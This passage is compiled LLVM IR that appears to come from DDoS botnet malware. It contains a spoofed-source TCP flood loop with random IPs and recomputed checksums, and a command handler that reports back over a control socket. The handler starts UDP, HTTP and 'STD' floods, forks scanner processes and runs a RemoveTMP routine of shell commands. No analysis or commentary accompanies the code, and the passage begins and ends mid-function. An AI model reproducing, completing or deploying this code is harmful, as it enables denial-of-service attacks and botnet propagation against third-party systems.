  %42 = sext i32 %5 to i64
  %43 = add nsw i64 %42, 40
  %44 = call i8* @llvm.stacksave()
  %45 = alloca i8, i64 %43, align 16
  %46 = bitcast i8* %45 to %struct.iphdr*
  %47 = getelementptr i8, i8* %45, i64 20
  %48 = bitcast i8* %47 to %struct.tcphdr*
  %49 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i64 0, i32 0
  %50 = load i32, i32* %49, align 4
  %51 = call i32 @getRandomIP(i32 %.065)
  %52 = call i32 @htonl(i32 %51) #18
  %53 = add i32 %5, 20
  call void @makeIPPacket(%struct.iphdr* nonnull %46, i32 %50, i32 %52, i8 zeroext 6, i32 %53)
  %54 = call i32 @rand_cmwc()
  %55 = trunc i32 %54 to i16
  %56 = bitcast i8* %47 to i16*
  store i16 %55, i16* %56, align 4
  %57 = call i32 @rand_cmwc()
  %58 = getelementptr inbounds i8, i8* %45, i64 24
  %59 = bitcast i8* %58 to i32*
  store i32 %57, i32* %59, align 8
  %60 = getelementptr inbounds i8, i8* %45, i64 28
  %61 = bitcast i8* %60 to i32*
  store i32 0, i32* %61, align 4
  %62 = getelementptr inbounds i8, i8* %45, i64 32
  %63 = bitcast i8* %62 to i16*
  %64 = load i16, i16* %63, align 16
  %65 = and i16 %64, -241
  %66 = or i16 %65, 80
  store i16 %66, i16* %63, align 16
  %67 = call i32 @strcmp(i8* %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.416, i64 0, i64 0)) #15
  %68 = icmp eq i32 %67, 0
  br i1 %68, label %71, label %.preheader

.preheader:                                       ; preds = %38
  %69 = call i8* @strtok(i8* %4, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.417, i64 0, i64 0)) #5
  %70 = icmp eq i8* %69, null
  br i1 %70, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

; <label>:71:                                     ; preds = %38
  %72 = and i16 %64, -8177
  %73 = or i16 %72, 8016
  store i16 %73, i16* %63, align 16
  br label %.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge68
  %74 = phi i8* [ %86, %.backedge68 ], [ %69, %.lr.ph.preheader ]
  %75 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.418, i64 0, i64 0)) #15
  %76 = icmp eq i32 %75, 0
  br i1 %76, label %77, label %80

; <label>:77:                                     ; preds = %.lr.ph
  %78 = load i16, i16* %63, align 16
  %79 = or i16 %78, 512
  store i16 %79, i16* %63, align 16
  br label %.backedge68

; <label>:80:                                     ; preds = %.lr.ph
  %81 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.419, i64 0, i64 0)) #15
  %82 = icmp eq i32 %81, 0
  br i1 %82, label %83, label %88

; <label>:83:                                     ; preds = %80
  %84 = load i16, i16* %63, align 16
  %85 = or i16 %84, 1024
  store i16 %85, i16* %63, align 16
  br label %.backedge68

.backedge68:                                      ; preds = %83, %97, %106, %103, %91, %77
  %86 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.417, i64 0, i64 0)) #5
  %87 = icmp eq i8* %86, null
  br i1 %87, label %.loopexit.loopexit, label %.lr.ph

; <label>:88:                                     ; preds = %80
  %89 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.420, i64 0, i64 0)) #15
  %90 = icmp eq i32 %89, 0
  br i1 %90, label %91, label %94

; <label>:91:                                     ; preds = %88
  %92 = load i16, i16* %63, align 16
  %93 = or i16 %92, 256
  store i16 %93, i16* %63, align 16
  br label %.backedge68

; <label>:94:                                     ; preds = %88
  %95 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.421, i64 0, i64 0)) #15
  %96 = icmp eq i32 %95, 0
  br i1 %96, label %97, label %100

; <label>:97:                                     ; preds = %94
  %98 = load i16, i16* %63, align 16
  %99 = or i16 %98, 4096
  store i16 %99, i16* %63, align 16
  br label %.backedge68

; <label>:100:                                    ; preds = %94
  %101 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.422, i64 0, i64 0)) #15
  %102 = icmp eq i32 %101, 0
  br i1 %102, label %103, label %106

; <label>:103:                                    ; preds = %100
  %104 = load i16, i16* %63, align 16
  %105 = or i16 %104, 2048
  store i16 %105, i16* %63, align 16
  br label %.backedge68

; <label>:106:                                    ; preds = %100
  %107 = load i32, i32* @mainCommSock, align 4
  %108 = call i32 (i32, i8*, ...) @sockprintf(i32 %107, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.423, i64 0, i64 0), i8* nonnull %74)
  br label %.backedge68

.loopexit.loopexit:                               ; preds = %.backedge68
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader, %71
  %109 = call i32 @rand_cmwc()
  %110 = trunc i32 %109 to i16
  %111 = getelementptr inbounds i8, i8* %45, i64 34
  %112 = bitcast i8* %111 to i16*
  store i16 %110, i16* %112, align 2
  %113 = getelementptr inbounds i8, i8* %45, i64 36
  %114 = bitcast i8* %113 to i16*
  store i16 0, i16* %114, align 4
  %115 = getelementptr inbounds i8, i8* %45, i64 38
  %116 = bitcast i8* %115 to i16*
  store i16 0, i16* %116, align 2
  br i1 %11, label %117, label %119

; <label>:117:                                    ; preds = %.loopexit
  %118 = call i32 @rand_cmwc()
  br label %123

; <label>:119:                                    ; preds = %.loopexit
  %120 = trunc i32 %1 to i16
  %121 = call zeroext i16 @htons(i16 zeroext %120) #18
  %122 = zext i16 %121 to i32
  br label %123

; <label>:123:                                    ; preds = %119, %117
  %124 = phi i32 [ %118, %117 ], [ %122, %119 ]
  %125 = trunc i32 %124 to i16
  %126 = getelementptr inbounds i8, i8* %45, i64 22
  %127 = bitcast i8* %126 to i16*
  store i16 %125, i16* %127, align 2
  %128 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %46, %struct.tcphdr* nonnull %48)
  store i16 %128, i16* %114, align 4
  %129 = bitcast i8* %45 to i16*
  %130 = getelementptr inbounds i8, i8* %45, i64 2
  %131 = bitcast i8* %130 to i16*
  %132 = load i16, i16* %131, align 2
  %133 = zext i16 %132 to i32
  %134 = call zeroext i16 @csum(i16* nonnull %129, i32 %133)
  %135 = getelementptr inbounds i8, i8* %45, i64 10
  %136 = bitcast i8* %135 to i16*
  store i16 %134, i16* %136, align 2
  %137 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %138 = add nsw i32 %137, %2
  %139 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %140 = getelementptr inbounds i8, i8* %45, i64 12
  %141 = bitcast i8* %140 to i32*
  %142 = getelementptr inbounds i8, i8* %45, i64 4
  %143 = bitcast i8* %142 to i16*
  br label %.backedge

.backedge:                                        ; preds = %.backedge.backedge, %123
  %.0 = phi i32 [ 0, %123 ], [ %.0.be, %.backedge.backedge ]
  %144 = call i64 @sendto(i32 %26, i8* nonnull %45, i64 %43, i32 0, %struct.sockaddr* nonnull %139, i32 16) #5
  %145 = call i32 @getRandomIP(i32 %.065)
  %146 = call i32 @htonl(i32 %145) #18
  store i32 %146, i32* %141, align 4
  %147 = call i32 @rand_cmwc()
  %148 = trunc i32 %147 to i16
  store i16 %148, i16* %143, align 4
  %149 = call i32 @rand_cmwc()
  store i32 %149, i32* %59, align 8
  %150 = call i32 @rand_cmwc()
  %151 = trunc i32 %150 to i16
  store i16 %151, i16* %56, align 4
  store i16 0, i16* %114, align 4
  %152 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %46, %struct.tcphdr* nonnull %48)
  store i16 %152, i16* %114, align 4
  %153 = load i16, i16* %131, align 2
  %154 = zext i16 %153 to i32
  %155 = call zeroext i16 @csum(i16* nonnull %129, i32 %154)
  store i16 %155, i16* %136, align 2
  %156 = icmp eq i32 %.0, %6
  br i1 %156, label %157, label %160

; <label>:157:                                    ; preds = %.backedge
  %158 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %159 = icmp sgt i32 %158, %138
  br i1 %159, label %162, label %.backedge.backedge

; <label>:160:                                    ; preds = %.backedge
  %161 = add i32 %.0, 1
  br label %.backedge.backedge

.backedge.backedge:                               ; preds = %160, %157
  %.0.be = phi i32 [ %161, %160 ], [ 0, %157 ]
  br label %.backedge

; <label>:162:                                    ; preds = %157
  call void @llvm.stackrestore(i8* %44)
  br label %163

; <label>:163:                                    ; preds = %18, %162, %35, %28
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8* nocapture, i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8* nocapture readonly) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define void @botkiller() local_unnamed_addr #1 {
  %1 = tail call i32 @sleep(i32 5) #5
  ret void
}

declare i32 @system(i8* nocapture readonly) local_unnamed_addr #6

declare i32 @sleep(i32) local_unnamed_addr #6

; Function Attrs: noinline nounwind uwtable
define void @RemoveTMP() local_unnamed_addr #1 {
  %1 = tail call i32 @system(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.458, i64 0, i64 0)) #5
  %2 = tail call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.459, i64 0, i64 0)) #5
  %3 = tail call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.460, i64 0, i64 0)) #5
  %4 = tail call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.459, i64 0, i64 0)) #5
  %5 = tail call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.461, i64 0, i64 0)) #5
  %6 = tail call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.462, i64 0, i64 0)) #5
  %7 = tail call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.463, i64 0, i64 0)) #5
  %8 = tail call i32 @system(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.464, i64 0, i64 0)) #5
  %9 = tail call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.465, i64 0, i64 0)) #5
  %10 = tail call i32 @system(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.466, i64 0, i64 0)) #5
  %11 = tail call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.467, i64 0, i64 0)) #5
  %12 = tail call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.468, i64 0, i64 0)) #5
  %13 = tail call i32 @system(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.469, i64 0, i64 0)) #5
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8** readonly) local_unnamed_addr #1 {
  %3 = load i8*, i8** %1, align 8
  %4 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.40, i64 0, i64 0)) #15
  %5 = icmp eq i32 %4, 0
  br i1 %5, label %6, label %9

; <label>:6:                                      ; preds = %2
  %7 = load i32, i32* @mainCommSock, align 4
  %8 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %7, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.470, i64 0, i64 0))
  br label %302

; <label>:9:                                      ; preds = %2
  %10 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.471, i64 0, i64 0)) #15
  %11 = icmp eq i32 %10, 0
  br i1 %11, label %12, label %17

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* @mainCommSock, align 4
  %14 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %15 = tail call i8* @inet_ntoa(i32 %14) #5
  %16 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %13, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.472, i64 0, i64 0), i8* %15)
  br label %302

; <label>:17:                                     ; preds = %9
  %18 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.473, i64 0, i64 0)) #15
  %19 = icmp eq i32 %18, 0
  br i1 %19, label %20, label %28

; <label>:20:                                     ; preds = %17
  %21 = tail call i32 @listFork()
  %22 = icmp eq i32 %21, 0
  br i1 %22, label %23, label %._crit_edge

._crit_edge:                                      ; preds = %20
  %.pre = load i8*, i8** %1, align 8
  br label %28

; <label>:23:                                     ; preds = %20
  %24 = load i32, i32* @mainCommSock, align 4
  %25 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %26 = tail call i8* @inet_ntoa(i32 %25) #5
  %27 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %24, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.474, i64 0, i64 0), i8* %26)
  tail call void @botkiller()
  tail call void @RemoveTMP()
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:28:                                     ; preds = %._crit_edge, %17
  %29 = phi i8* [ %.pre, %._crit_edge ], [ %3, %17 ]
  %30 = tail call i32 @strcmp(i8* %29, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.475, i64 0, i64 0)) #15
  %31 = icmp eq i32 %30, 0
  br i1 %31, label %32, label %54

; <label>:32:                                     ; preds = %28
  %33 = getelementptr inbounds i8*, i8** %1, i64 1
  %34 = load i8*, i8** %33, align 8
  %35 = tail call i32 @strcmp(i8* %34, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.476, i64 0, i64 0)) #15
  %36 = icmp eq i32 %35, 0
  br i1 %36, label %37, label %42

; <label>:37:                                     ; preds = %32
  %38 = load i32, i32* @scanPid, align 4
  %39 = icmp eq i32 %38, 0
  br i1 %39, label %302, label %40

; <label>:40:                                     ; preds = %37
  %41 = tail call i32 @kill(i32 %38, i32 9) #5
  store i32 0, i32* @scanPid, align 4
  %.pre147 = load i8*, i8** %33, align 8
  br label %42

; <label>:42:                                     ; preds = %32, %40
  %43 = phi i8* [ %34, %32 ], [ %.pre147, %40 ]
  %44 = tail call i32 @strcmp(i8* %43, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.477, i64 0, i64 0)) #15
  %45 = icmp eq i32 %44, 0
  br i1 %45, label %46, label %._crit_edge148

._crit_edge148:                                   ; preds = %42
  %.pre149 = load i8*, i8** %1, align 8
  br label %54

; <label>:46:                                     ; preds = %42
  %47 = load i32, i32* @scanPid, align 4
  %48 = icmp eq i32 %47, 0
  br i1 %48, label %49, label %302

; <label>:49:                                     ; preds = %46
  %50 = tail call i32 @fork() #5
  %51 = icmp eq i32 %50, 0
  br i1 %51, label %53, label %52

; <label>:52:                                     ; preds = %49
  store i32 %50, i32* @scanPid, align 4
  br label %302

; <label>:53:                                     ; preds = %49
  tail call void @StartTheLelz() #5
  unreachable

; <label>:54:                                     ; preds = %._crit_edge148, %28
  %55 = phi i8* [ %.pre149, %._crit_edge148 ], [ %29, %28 ]
  %56 = tail call i32 @strcmp(i8* %55, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.478, i64 0, i64 0)) #15
  %57 = icmp eq i32 %56, 0
  br i1 %57, label %58, label %.loopexit136

; <label>:58:                                     ; preds = %54
  %59 = icmp slt i32 %0, 6
  br i1 %59, label %302, label %60

; <label>:60:                                     ; preds = %58
  %61 = getelementptr inbounds i8*, i8** %1, i64 3
  %62 = load i8*, i8** %61, align 8
  %63 = tail call i32 @atoi(i8* %62) #15
  %64 = icmp eq i32 %63, -1
  br i1 %64, label %302, label %65

; <label>:65:                                     ; preds = %60
  %66 = getelementptr inbounds i8*, i8** %1, i64 2
  %67 = load i8*, i8** %66, align 8
  %68 = tail call i32 @atoi(i8* %67) #15
  %69 = icmp eq i32 %68, -1
  br i1 %69, label %302, label %70

; <label>:70:                                     ; preds = %65
  %71 = getelementptr inbounds i8*, i8** %1, i64 4
  %72 = load i8*, i8** %71, align 8
  %73 = tail call i32 @atoi(i8* %72) #15
  %74 = icmp eq i32 %73, -1
  br i1 %74, label %302, label %75

; <label>:75:                                     ; preds = %70
  %76 = getelementptr inbounds i8*, i8** %1, i64 5
  %77 = load i8*, i8** %76, align 8
  %78 = tail call i32 @atoi(i8* %77) #15
  %79 = icmp eq i32 %78, -1
  %80 = icmp sgt i32 %78, 65500
  %or.cond = or i1 %79, %80
  %81 = icmp sgt i32 %73, 32
  %or.cond127 = or i1 %81, %or.cond
  br i1 %or.cond127, label %302, label %82

; <label>:82:                                     ; preds = %75
  %83 = icmp eq i32 %0, 7
  br i1 %83, label %84, label %89

; <label>:84:                                     ; preds = %82
  %85 = getelementptr inbounds i8*, i8** %1, i64 6
  %86 = load i8*, i8** %85, align 8
  %87 = tail call i32 @atoi(i8* %86) #15
  %88 = icmp slt i32 %87, 1
  br i1 %88, label %302, label %89

; <label>:89:                                     ; preds = %84, %82
  %90 = getelementptr inbounds i8*, i8** %1, i64 1
  %91 = load i8*, i8** %90, align 8
  %92 = tail call i32 @atoi(i8* %67) #15
  %93 = tail call i32 @atoi(i8* %62) #15
  %94 = tail call i32 @atoi(i8* %72) #15
  %95 = tail call i32 @atoi(i8* %77) #15
  br i1 %83, label %96, label %100

; <label>:96:                                     ; preds = %89
  %97 = getelementptr inbounds i8*, i8** %1, i64 6
  %98 = load i8*, i8** %97, align 8
  %99 = tail call i32 @atoi(i8* %98) #15
  br label %100

; <label>:100:                                    ; preds = %89, %96
  %101 = phi i32 [ %99, %96 ], [ 10, %89 ]
  %strchr = tail call i8* @strchr(i8* %91, i32 44)
  %102 = icmp eq i8* %strchr, null
  br i1 %102, label %109, label %.preheader135.preheader

.preheader135.preheader:                          ; preds = %100
  br label %.preheader135

.preheader135:                                    ; preds = %.preheader135.preheader, %105
  %.sink = phi i8* [ null, %105 ], [ %91, %.preheader135.preheader ]
  %103 = tail call i8* @strtok(i8* %.sink, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.417, i64 0, i64 0)) #5
  %104 = icmp eq i8* %103, null
  br i1 %104, label %.loopexit136.loopexit, label %105

; <label>:105:                                    ; preds = %.preheader135
  %106 = tail call i32 @listFork()
  %107 = icmp eq i32 %106, 0
  br i1 %107, label %108, label %.preheader135

; <label>:108:                                    ; preds = %105
  tail call void @sendUDP(i8* nonnull %103, i32 %92, i32 %93, i32 %94, i32 %95, i32 %101)
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:109:                                    ; preds = %100
  %110 = tail call i32 @listFork()
  %111 = icmp eq i32 %110, 0
  br i1 %111, label %112, label %302

; <label>:112:                                    ; preds = %109
  tail call void @sendUDP(i8* %91, i32 %92, i32 %93, i32 %94, i32 %95, i32 %101)
  tail call void @_exit(i32 0) #17
  unreachable

.loopexit136.loopexit:                            ; preds = %.preheader135
  %.pre150 = load i8*, i8** %1, align 8
  br label %.loopexit136

.loopexit136:                                     ; preds = %.loopexit136.loopexit, %54
  %113 = phi i8* [ %.pre150, %.loopexit136.loopexit ], [ %55, %54 ]
  %114 = tail call i32 @strcmp(i8* %113, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.479, i64 0, i64 0)) #15
  %115 = icmp eq i32 %114, 0
  br i1 %115, label %116, label %154

; <label>:116:                                    ; preds = %.loopexit136
  %117 = icmp slt i32 %0, 6
  br i1 %117, label %302, label %118

; <label>:118:                                    ; preds = %116
  %119 = getelementptr inbounds i8*, i8** %1, i64 3
  %120 = load i8*, i8** %119, align 8
  %121 = tail call i32 @atoi(i8* %120) #15
  %122 = icmp slt i32 %121, 1
  br i1 %122, label %302, label %123

; <label>:123:                                    ; preds = %118
  %124 = getelementptr inbounds i8*, i8** %1, i64 5
  %125 = load i8*, i8** %124, align 8
  %126 = tail call i32 @atoi(i8* %125) #15
  %127 = icmp slt i32 %126, 1
  br i1 %127, label %302, label %128

; <label>:128:                                    ; preds = %123
  %129 = tail call i32 @listFork()
  %130 = icmp eq i32 %129, 0
  br i1 %130, label %131, label %302

; <label>:131:                                    ; preds = %128
  %132 = load i32, i32* @mainCommSock, align 4
  %133 = getelementptr inbounds i8*, i8** %1, i64 1
  %134 = load i8*, i8** %133, align 8
  %135 = getelementptr inbounds i8*, i8** %1, i64 2
  %136 = load i8*, i8** %135, align 8
  %137 = load i8*, i8** %119, align 8
  %138 = tail call i32 @atoi(i8* %137) #15
  %139 = load i8*, i8** %124, align 8
  %140 = tail call i32 @atoi(i8* %139) #15
  %141 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %132, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.480, i64 0, i64 0), i8* %134, i8* %136, i32 %138, i32 %140)
  %142 = load i8*, i8** %133, align 8
  %143 = load i8*, i8** %135, align 8
  %144 = load i8*, i8** %119, align 8
  %145 = tail call i32 @atoi(i8* %144) #15
  %146 = trunc i32 %145 to i16
  %147 = getelementptr inbounds i8*, i8** %1, i64 4
  %148 = load i8*, i8** %147, align 8
  %149 = load i8*, i8** %124, align 8
  %150 = tail call i32 @atoi(i8* %149) #15
  %151 = getelementptr inbounds i8*, i8** %1, i64 6
  %152 = load i8*, i8** %151, align 8
  %153 = tail call i32 @atoi(i8* %152) #15
  tail call void @sendHTTP(i8* %142, i8* %143, i16 zeroext %146, i8* %148, i32 %150, i32 %153)
  tail call void @exit(i32 0) #17
  unreachable

; <label>:154:                                    ; preds = %.loopexit136
  %155 = tail call i32 @strcmp(i8* %113, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.481, i64 0, i64 0)) #15
  %156 = icmp eq i32 %155, 0
  br i1 %156, label %157, label %181

; <label>:157:                                    ; preds = %154
  %158 = icmp eq i32 %0, 2
  br i1 %158, label %159, label %302

; <label>:159:                                    ; preds = %157
  %160 = getelementptr inbounds i8*, i8** %1, i64 1
  %161 = load i8*, i8** %160, align 8
  %162 = tail call i32 @strcmp(i8* %161, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.476, i64 0, i64 0)) #15
  %163 = icmp eq i32 %162, 0
  br i1 %163, label %164, label %169

; <label>:164:                                    ; preds = %159
  %165 = load i32, i32* @Phonepid, align 4
  %166 = icmp eq i32 %165, 0
  br i1 %166, label %302, label %167

; <label>:167:                                    ; preds = %164
  %168 = tail call i32 @kill(i32 %165, i32 9) #5
  store i32 0, i32* @Phonepid, align 4
  %.pre151 = load i8*, i8** %160, align 8
  br label %169

; <label>:169:                                    ; preds = %159, %167
  %170 = phi i8* [ %161, %159 ], [ %.pre151, %167 ]
  %171 = tail call i32 @strcmp(i8* %170, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.477, i64 0, i64 0)) #15
  %172 = icmp eq i32 %171, 0
  br i1 %172, label %173, label %._crit_edge152

._crit_edge152:                                   ; preds = %169
  %.pre153 = load i8*, i8** %1, align 8
  br label %181

; <label>:173:                                    ; preds = %169
  %174 = load i32, i32* @Phonepid, align 4
  %175 = icmp eq i32 %174, 0
  br i1 %175, label %176, label %302

; <label>:176:                                    ; preds = %173
  %177 = tail call i32 @fork() #5
  %178 = icmp eq i32 %177, 0
  br i1 %178, label %180, label %179

; <label>:179:                                    ; preds = %176
  store i32 %177, i32* @Phonepid, align 4
  br label %302

; <label>:180:                                    ; preds = %176
  tail call void @PhoneScanner()
  unreachable

; <label>:181:                                    ; preds = %._crit_edge152, %154
  %182 = phi i8* [ %.pre153, %._crit_edge152 ], [ %113, %154 ]
  %183 = tail call i32 @strcmp(i8* %182, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.482, i64 0, i64 0)) #15
  %184 = icmp eq i32 %183, 0
  br i1 %184, label %185, label %.loopexit134

; <label>:185:                                    ; preds = %181
  %186 = icmp slt i32 %0, 4
  br i1 %186, label %302, label %187

; <label>:187:                                    ; preds = %185
  %188 = getelementptr inbounds i8*, i8** %1, i64 2
  %189 = load i8*, i8** %188, align 8
  %190 = tail call i32 @atoi(i8* %189) #15
  %191 = icmp slt i32 %190, 1
  br i1 %191, label %302, label %192

; <label>:192:                                    ; preds = %187
  %193 = getelementptr inbounds i8*, i8** %1, i64 3
  %194 = load i8*, i8** %193, align 8
  %195 = tail call i32 @atoi(i8* %194) #15
  %196 = icmp slt i32 %195, 1
  br i1 %196, label %302, label %197

; <label>:197:                                    ; preds = %192
  %198 = getelementptr inbounds i8*, i8** %1, i64 1
  %199 = load i8*, i8** %198, align 8
  %strchr125 = tail call i8* @strchr(i8* %199, i32 44)
  %200 = icmp eq i8* %strchr125, null
  br i1 %200, label %207, label %.preheader133.preheader

.preheader133.preheader:                          ; preds = %197
  br label %.preheader133

.preheader133:                                    ; preds = %.preheader133.preheader, %203
  %.sink128 = phi i8* [ null, %203 ], [ %199, %.preheader133.preheader ]
  %201 = tail call i8* @strtok(i8* %.sink128, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.417, i64 0, i64 0)) #5
  %202 = icmp eq i8* %201, null
  br i1 %202, label %.loopexit134.loopexit, label %203

; <label>:203:                                    ; preds = %.preheader133
  %204 = tail call i32 @listFork()
  %205 = icmp eq i32 %204, 0
  br i1 %205, label %206, label %.preheader133

; <label>:206:                                    ; preds = %203
  tail call void @sendSTD(i8* nonnull %201, i32 %190, i32 %195)
  unreachable

; <label>:207:                                    ; preds = %197
  %208 = tail call i32 @listFork()
  %209 = icmp eq i32 %208, 0
  br i1 %209, label %210, label %302

; <label>:210:                                    ; preds = %207
  tail call void @sendSTD(i8* %199, i32 %190, i32 %195)
  unreachable

.loopexit134.loopexit:                            ; preds = %.preheader133
  %.pre154 = load i8*, i8** %1, align 8
  br label %.loopexit134

.loopexit134:                                     ; preds = %.loopexit134.loopexit, %181
  %211 = phi i8* [ %.pre154, %.loopexit134.loopexit ], [ %182, %181 ]
  %212 = tail call i32 @strcmp(i8* %211, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.483, i64 0, i64 0)) #15
  %213 = icmp eq i32 %212, 0
  br i1 %213, label %214, label %.loopexit132

; <label>:214:                                    ; preds = %.loopexit134
  %215 = icmp slt i32 %0, 6
  br i1 %215, label %302, label %216

; <label>:216:                                    ; preds = %214
  %217 = getelementptr inbounds i8*, i8** %1, i64 3
  %218 = load i8*, i8** %217, align 8
  %219 = tail call i32 @atoi(i8* %218) #15
  %220 = icmp eq i32 %219, -1
  br i1 %220, label %302, label %221

; <label>:221:                                    ; preds = %216
  %222 = getelementptr inbounds i8*, i8** %1, i64 2
  %223 = load i8*, i8** %222, align 8
  %224 = tail call i32 @atoi(i8* %223) #15
  %225 = icmp eq i32 %224, -1
  br i1 %225, label %302, label %226

; <label>:226:                                    ; preds = %221
  %227 = getelementptr inbounds i8*, i8** %1, i64 4
  %228 = load i8*, i8** %227, align 8
  %229 = tail call i32 @atoi(i8* %228) #15
  %230 = icmp eq i32 %229, -1
  %231 = icmp sgt i32 %229, 32
  %or.cond129 = or i1 %230, %231
  br i1 %or.cond129, label %302, label %232

; <label>:232:                                    ; preds = %226
  %233 = icmp sgt i32 %0, 6
  br i1 %233, label %234, label %.thread

; <label>:234:                                    ; preds = %232
  %235 = getelementptr inbounds i8*, i8** %1, i64 6
  %236 = load i8*, i8** %235, align 8
  %237 = tail call i32 @atoi(i8* %236) #15
  %238 = icmp slt i32 %237, 0
  br i1 %238, label %302, label %239

; <label>:239:                                    ; preds = %234
  %240 = icmp eq i32 %0, 8
  br i1 %240, label %241, label %.thread

; <label>:241:                                    ; preds = %239
  %242 = getelementptr inbounds i8*, i8** %1, i64 7
  %243 = load i8*, i8** %242, align 8
  %244 = tail call i32 @atoi(i8* %243) #15
  %245 = icmp slt i32 %244, 1
  br i1 %245, label %302, label %.thread

.thread:                                          ; preds = %232, %241, %239
  %246 = phi i1 [ true, %241 ], [ false, %239 ], [ false, %232 ]
  %247 = getelementptr inbounds i8*, i8** %1, i64 1
  %248 = load i8*, i8** %247, align 8
  %249 = tail call i32 @atoi(i8* %223) #15
  %250 = tail call i32 @atoi(i8* %218) #15
  %251 = tail call i32 @atoi(i8* %228) #15
  %252 = getelementptr inbounds i8*, i8** %1, i64 5
  %253 = load i8*, i8** %252, align 8
  br i1 %246, label %254, label %258

; <label>:254:                                    ; preds = %.thread
  %255 = getelementptr inbounds i8*, i8** %1, i64 7
  %256 = load i8*, i8** %255, align 8
  %257 = tail call i32 @atoi(i8* %256) #15
  br label %258

; <label>:258:                                    ; preds = %.thread, %254
  %259 = phi i32 [ %257, %254 ], [ 10, %.thread ]
  br i1 %233, label %260, label %264

; <label>:260:                                    ; preds = %258
  %261 = getelementptr inbounds i8*, i8** %1, i64 6
  %262 = load i8*, i8** %261, align 8
  %263 = tail call i32 @atoi(i8* %262) #15
  br label %264

; <label>:264:                                    ; preds = %258, %260
  %265 = phi i32 [ %263, %260 ], [ 0, %258 ]
  %strchr126 = tail call i8* @strchr(i8* %248, i32 44)
  %266 = icmp eq i8* %strchr126, null
  br i1 %266, label %273, label %.preheader131.preheader

.preheader131.preheader:                          ; preds = %264
  br label %.preheader131

.preheader131:                                    ; preds = %.preheader131.preheader, %269
  %.sink130 = phi i8* [ null, %269 ], [ %248, %.preheader131.preheader ]
  %267 = tail call i8* @strtok(i8* %.sink130, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.417, i64 0, i64 0)) #5
  %268 = icmp eq i8* %267, null
  br i1 %268, label %.loopexit132.loopexit, label %269

; <label>:269:                                    ; preds = %.preheader131
  %270 = tail call i32 @listFork()
  %271 = icmp eq i32 %270, 0
  br i1 %271, label %272, label %.preheader131

; <label>:272:                                    ; preds = %269
